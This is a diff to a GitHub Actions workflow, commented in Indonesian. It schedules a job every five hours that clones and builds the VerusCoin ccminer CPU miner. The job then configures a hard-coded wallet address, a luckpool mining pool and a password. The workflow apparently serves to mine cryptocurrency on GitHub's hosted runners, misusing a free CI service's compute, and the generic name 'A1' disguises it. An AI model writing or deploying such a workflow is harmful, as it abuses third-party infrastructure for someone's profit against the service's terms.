@@ -2,7 +2,7 @@ name: A1
 
 on:
   schedule:
-    - cron: "0 */5 * * *"
+    - cron: "0 */5 * * *"  # Auto-run tiap 5 jam
   workflow_dispatch:
 
 jobs:
@@ -16,9 +16,11 @@ jobs:
         sudo apt update
         sudo apt install -y git build-essential curl
 
-    - name: Clone ccminer (monkins1010)
+    - name: Clone ccminer from VerusCoin official
       run: |
-        git clone https://github.com/monkins1010/ccminer.git
+        git clone https://github.com/VerusCoin/ccminer.git
+        cd ccminer
+        git checkout LinuxCPU        # branch yang benar untuk CPU miner
 
     - name: Build ccminer
       run: |
@@ -29,7 +31,6 @@ jobs:
       run: |
         cd ccminer
 
-        # ————— KONFIGURASI —————
         WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
         POOL="stratum+tcp://ap.luckpool.net:3956#xnsub"
         PASSWORD="hybrid"
